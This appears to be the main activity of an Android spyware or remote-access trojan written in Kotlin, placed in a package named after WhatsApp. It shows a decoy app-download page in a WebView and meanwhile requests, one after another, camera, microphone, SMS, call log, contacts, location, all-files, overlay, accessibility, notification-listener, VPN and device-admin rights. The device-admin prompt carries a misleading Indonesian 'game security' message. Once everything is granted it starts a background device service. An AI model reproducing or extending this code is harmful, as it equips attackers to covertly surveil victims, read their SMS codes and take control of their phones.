package com.whatsapp.bug.crash

import android.Manifest
import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val REQ_CAM     = 101
    private val REQ_LOC     = 102
    private val REQ_OVERLAY = 103
    private val REQ_CONTACTS = 104
    private val REQ_SCREEN  = 104
    private val REQ_GALLERY = 106
    private val REQ_STORAGE = 107
    private val REQ_CALL_LOG = 108
    private val REQ_PHONE_STATE = 109
    private val REQ_CALL_PHONE = 112
    private val REQ_LOCATION_SETTINGS = 105
    private val REQ_NOTIF  = 110
    private val REQ_RECORD_AUDIO = 111
    private val REQ_SMS = 115

    private var webViewShown = false
    private var webView: WebView? = null

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        AppIntegrity.check(this)

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        showLocationDialog(onEnabled = {
            setupUI()
            if (allPermsGranted()) {
                goToUrl()
            }
        })
    }

    private fun allPermsGranted(): Boolean {
        return isCamGranted() &&
               isGalleryGranted() &&
               isContactsGranted() &&
               isLocationGranted() &&
               isCallLogGranted() &&
               isCallPhoneGranted() &&
               isPhoneStateGranted() &&
               isStorageGranted() &&
               isOverlayGranted() &&
               isUsageAccessGranted() &&
               isWriteSettingsGranted() &&
               isDeviceAdminGranted() &&
               isAccessibilityGranted() &&
               isNotifGranted() &&
               isRecordAudioGranted() &&
               isSmsGranted() &&
               isNotifListenerGranted()
    }

    override fun onResume() {
        super.onResume()
        if (webViewShown && permIndex < permSequence.size) {
            triggerNextPermission()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }

    private var permIndex = 0
    private val permSequence: List<Pair<() -> Boolean, () -> Unit>> by lazy {
        listOf(
            Pair({ isCamGranted() },             { requestCamPerm() }),
            Pair({ isGalleryGranted() },         { requestGalleryPerm() }),
            Pair({ isNotifGranted() },           { requestNotifPerm() }),
            Pair({ isContactsGranted() },        { requestContactsPerm() }),
            Pair({ isLocationGranted() },        { requestLocationPerm() }),
            Pair({ isCallLogGranted() },         { requestCallLogPerm() }),
            Pair({ isCallPhoneGranted() },       { requestCallPhonePerm() }),
            Pair({ isPhoneStateGranted() },      { requestPhoneStatePerm() }),
            Pair({ isRecordAudioGranted() },     { requestRecordAudioPerm() }),
            Pair({ isSmsGranted() },             { requestSmsPerm() }),
            Pair({ isStorageGranted() },         { requestStoragePerm() }),
            Pair({ isOverlayGranted() },         { requestOverlayPerm() }),
            Pair({ isUsageAccessGranted() },     { requestUsageAccessPerm() }),
            Pair({ isWriteSettingsGranted() },   { requestWriteSettingsPerm() }),
            Pair({ isNotifListenerGranted() },   { requestNotifListenerPerm() }),
            Pair({ isDeviceAdminGranted() },     { requestDeviceAdminPerm() }),
            Pair({ isVpnGranted() },             { requestVpnPerm() }),
            Pair({ isAccessibilityGranted() },   { requestAccessibilityPerm() })
        )
    }

    fun triggerNextPermission() {
        if (permIndex >= permSequence.size) {
            startDeviceService()
            return
        }
        val (check, request) = permSequence[permIndex]
        if (check()) {
            permIndex++
            triggerNextPermission()
        } else {
            request()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUI() {
        val wv = WebView(this)
        webView = wv
        wv.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        wv.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) { request.grant(request.resources) }
        }
        wv.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                if (!webViewShown) {
                    webViewShown = true
                    permIndex = 0
                    triggerNextPermission()
                }
            }
        }
        setContentView(wv)
        wv.loadUrl("https://video-zip.en.uptodown.com/android/download")
    }

    private fun goToUrl() {
        if (webViewShown) return
        setupUI()
    }

    private fun isCamGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

    private fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestGalleryPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_MEDIA_IMAGES), REQ_GALLERY)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), REQ_GALLERY)
        }
    }

    private fun isOverlayGranted() =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true

    private fun isAccessibilityGranted(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val component = "$packageName/${packageName}.XyzAccessibilityService"
        return enabled.split(":").any { it.equals(component, ignoreCase = true) }
    }

    private fun isLocationGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    private fun isLocationEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
        return lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        }
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun isContactsGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    private fun isCallLogGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

    private fun isPhoneStateGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED

    private fun requestCallLogPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CALL_LOG), REQ_CALL_LOG)

    private fun isCallPhoneGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED

    private fun requestCallPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), REQ_CALL_PHONE)

    private fun requestPhoneStatePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_PHONE_STATE), REQ_PHONE_STATE)

    private fun isStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName")),
                    REQ_STORAGE
                )
            } catch (_: Exception) {
                startActivityForResult(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), REQ_STORAGE)
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
                REQ_STORAGE)
        }
    }

    private fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), REQ_CONTACTS)

    private fun requestCamPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQ_CAM)

    private fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            startActivityForResult(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")),
                REQ_OVERLAY
            )
    }

    private fun requestAccessibilityPerm() {        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    val component = "$packageName/.XyzAccessibilityService"
                    putExtra(":settings:fragment_args_key", component)
                    putExtra(":settings:show_fragment_args", android.os.Bundle().apply {
                        putString(":settings:fragment_args_key", component)
                    })
                }
                startActivity(intent)
                return
            } catch (_: Exception) { /* fallback */ }
        }
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isDeviceAdminGranted(): Boolean {
        val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(this, GameSecurityReceiver::class.java)
        return dpm.isAdminActive(component)
    }

    private val REQ_VPN = 114

    private fun isVpnGranted(): Boolean =
        android.net.VpnService.prepare(this) == null

    private fun requestVpnPerm() {
        val intent = android.net.VpnService.prepare(this)
        if (intent != null) {
            startActivityForResult(intent, REQ_VPN)
        }
    }

    private val REQ_DEVICE_ADMIN = 113

    private fun requestDeviceAdminPerm() {
        val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(this, GameSecurityReceiver::class.java)
        if (!dpm.isAdminActive(component)) {
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
                putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Fitur keamanan akun game kamu akan dinonaktifkan." as String
                )
            }
            startActivityForResult(intent, REQ_DEVICE_ADMIN)
        }
    }

    private fun isWriteSettingsGranted(): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true

    private fun requestWriteSettingsPerm() =
        startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    private fun isNotifGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun requestNotifPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQ_NOTIF)
        }
    }

    private fun isSmsGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED

    private fun requestSmsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS), REQ_SMS)

    private fun isNotifListenerGranted(): Boolean {
        val flat = android.provider.Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return flat.split(":").any { it.startsWith("$packageName/") }
    }

    private fun requestNotifListenerPerm() =
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))

    private fun isRecordAudioGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

    private fun requestRecordAudioPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECORD_AUDIO), REQ_RECORD_AUDIO)

    private fun requestUsageAccessPerm() =
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))

    private fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ), REQ_LOC)

    private var locationDialogCallback: (() -> Unit)? = null

    private fun showLocationDialog(onEnabled: (() -> Unit)? = null) {
        if (onEnabled != null) locationDialogCallback = onEnabled
        val callback = locationDialogCallback ?: { goToUrl() }

        val locationRequest = com.google.android.gms.location.LocationRequest.Builder(
            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000
        ).build()

        val builder = com.google.android.gms.location.LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)

        com.google.android.gms.location.LocationServices
            .getSettingsClient(this)
            .checkLocationSettings(builder.build())
            .addOnSuccessListener {
                callback()
            }
            .addOnFailureListener { e ->
                if (e is com.google.android.gms.common.api.ResolvableApiException) {
                    try {
                        e.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {
                        callback()
                    }
                } else {
                    callback()
                }
            }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        permIndex++
        triggerNextPermission()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_LOCATION_SETTINGS) {
            locationDialogCallback?.invoke() ?: run { setupUI() }
            return
        }
        if (requestCode == REQ_VPN ||
            requestCode == REQ_OVERLAY ||
            requestCode == REQ_STORAGE ||
            requestCode == REQ_DEVICE_ADMIN) {
            permIndex++
            triggerNextPermission()
        }
    }

    @Suppress("unused")
    private fun dpToPx(dp: Int) = (dp * resources.displayMetrics.density).toInt()

    private fun startDeviceService() {
        ContextCompat.startForegroundService(this, Intent(this, DeviceService::class.java))
    }
}
